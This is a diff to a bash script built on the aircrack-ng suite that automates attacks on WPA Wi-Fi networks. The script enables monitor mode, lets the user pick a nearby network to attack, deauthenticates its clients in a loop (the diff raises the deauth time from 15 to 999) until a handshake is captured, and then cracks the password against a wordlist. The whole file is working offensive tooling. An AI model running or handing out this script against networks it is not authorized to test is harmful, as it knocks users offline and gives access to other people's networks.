@@ -5,7 +5,7 @@
 ################## SHORTCUTS/STUFFS ##########################
 
 # Deauth time for aireplay-ng
-deauthtime=15
+deauthtime=999
 
 # Create auxiliar folders for handshake/password
 mkdir -p handshakes
@@ -58,8 +58,8 @@ userpath="`whoami`@`hostname`:`pwd`#"
 
 # Precautions
 trap ctrl_c INT
-function ctrl_c(){
-	echo -e "${NC}\n"
+function ctrl_c () {
+	echo -e "${NC}"
 	END
 }
 
@@ -189,18 +189,20 @@ function MONMODE {
 
 	read -e -p $'\x0a# Select the network card you want to use [enter for wlan0]: ' nicreal
 
-	if [ -z "$nicreal" ] ; then
+	if [ -z "$nicreal" ] || [ "$nicreal" = "wlan0" ]; then
 		nicreal=wlan0
+
+		# Kill all process the could couse trouble to aircrack family
+	
+		airmon-ng check kill &> /dev/null &
 	else
 		while ! iwconfig 2>/dev/null | grep -w -q $nicreal ; do
 			read -e -p $'\x0a# Sorry, this network card don\'t exist, try again: ' nicreal
 		done
 	fi
 
-# Kill all process the could couse trouble to aircrack family
 
-	airmon-ng check kill &> /dev/null &
-
+	
 # Check if exist the mon0 nic, else, create and activate
 
 	if `iw dev | grep -q $nic`; then
@@ -237,31 +239,48 @@ function EDTCHN {
 		airodumpall
 	fi
 
-# Output edit
+### Output edit ###
 
-# The most itens
+# Generate base file
 
-	cat target-01.kismet.csv | cut -d ';' -f1,4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g'| column -t > auxfile1
+cat target-01.kismet.csv | cut -d ';' -f4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g' | column -t > auxfile0
 
-# The network name
+# Generate names
 
-	cat target-01.kismet.csv | cut -d ';' -f3 > auxfile2
+cat target-01.kismet.csv | cut -d ';' -f3 > auxfile1
+
+# Paste and sort
+
+paste -d " " auxfile0 /dev/null auxfile1 | sort -k3 -n -r > auxfile2
+
+# Generate body
+
+tail -n +2 auxfile2 | nl | sed -e 's/^[ \t]*//' > auxfile3
+
+# Generate banner
+
+head -n 1 auxfile2 | sed -e 's/^/Network /' > auxfile4
+
+# Finish and store in a file
+
+cat auxfile4 auxfile3 > auxfile5
+
+### End ###
 
 # Choose network
 
-	paste -d " " auxfile1 /dev/null auxfile2 > auxfile3
 	echo -e "\n--------------------------------------------------------------"
-	cat auxfile3
+	cat auxfile5
 	echo -e "^-------------------------------------------------------------\n"
 	read -e -p "# 2) Select the network you want to attack [1,2,3...N]: " num
 	let num=num+1
 
 # Based on users option, get the host: mac, channel and name
 
-	bssidtarget=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $2}')
-	channel=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $3}')
-	networkname=$(cat auxfile3 | awk -v aux=$num 'NR==aux' | tr -s ' ' | cut -d ' ' -f5-8 | tr -d "[:blank:]")
-	rm -rf auxfile*
+	bssidtarget=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $2}')
+	channel=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $3}')
+	networkname=$(cat auxfile5 | awk -v aux=$num 'NR==aux {print $5 $6 $7 $8}')
+	#rm -rf auxfile*
 	rm -rf $name-01.kismet.csv
 	name=$networkname"_"$bssidtarget
 
@@ -307,14 +326,16 @@ function ATTAIR {
 
 # Attack clients host until find handshake packet
 
-	while `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
-		getclients	
-		while [ $nr -gt 0 ]; do
-			bssidclient=$(awk -v var=$nr 'NR==var' $mac)
+	aux=1
+	while `aircrack-ng $name-01.cap 2>/dev/null | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
+		getclients
+		echo -e -n "    "
+		while [ $aux -le $nr ]; do
+			bssidclient=$(awk -v var=$aux 'NR==var' $mac)
 			deauthesp
-			let nr=nr-1
-			sleep 5
+			let aux=aux+1
 		done
+
 	done
 
 # Clean handshake packet and erase the previous version of .cap
@@ -343,9 +364,9 @@ function WORDLIST {
 # Verify if the wordlist exist 
 
 	a=0
-	while [ $a -eq 0  ]; do
-		if [ !  -f $path ]; then
-			read -e -p $'\0xa# Wordlist not found, try again: #\x0a'"$userpath " path
+	while [ $a -eq 0 ]; do
+		if [ ! -f $path ]; then
+			read -e -p $'\x0a# Wordlist not found, try again: #\x0a'"$userpath " path
 		else
 			a=1
 		fi
@@ -378,8 +399,9 @@ function AIRCRACK {
 	if [ -s ./passwords/$name-password.txt ]; then
 		echo -e "\n# Sucess !! The password is: ${BLUE} `cat ./passwords/$name-password.txt` ${NC} !!! #\n"
 	else
-		read -e -p $'\x0a# Sad news but... This wordlist haven\'t the password =/... Try again with a new one? [y/n] #' opt
-		if [ $opt = "y" ] || [ $opt = "Y" ]; then
+		clear
+		read -e -p $'\x0a# Sad news but... This wordlist haven\'t the password =/... Try again with a new one? [y/n]: ' opt
+		if [ "$opt" = "y" ] || [ "$opt" = "Y" ]; then
 			WORDLIST
 		else
 			END
@@ -400,7 +422,7 @@ function END {
 
 	# Delete the mon0 virtual interface
 
-	echo "[+] Deleting network card if created..."
+	echo -e "\n[+] Deleting network card if created..."
 
 	if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
 		iw dev $nic del &>/dev/null
@@ -415,14 +437,19 @@ function END {
 	rm -rf $name-01.cap &>/dev/null
 	rm -rf $name.lst &>/dev/null
 	rm -rf target-0* &>/dev/null
+	#rm -rf auxfile* &>/dev/null
 	rm -rf $name-passwd.txt &>/dev/null
 	sleep $st
 
 	# Restart the network services by two ways
 
 	echo "[+] Restarting network services..."
-	service NetworkManager restart
-	service networking restart
+
+	if [ "$nicreal" = "wlan0" ]; then 
+		service NetworkManager restart
+		service networking restart
+	fi
+
 	sleep $st
 
 	# Thanks!
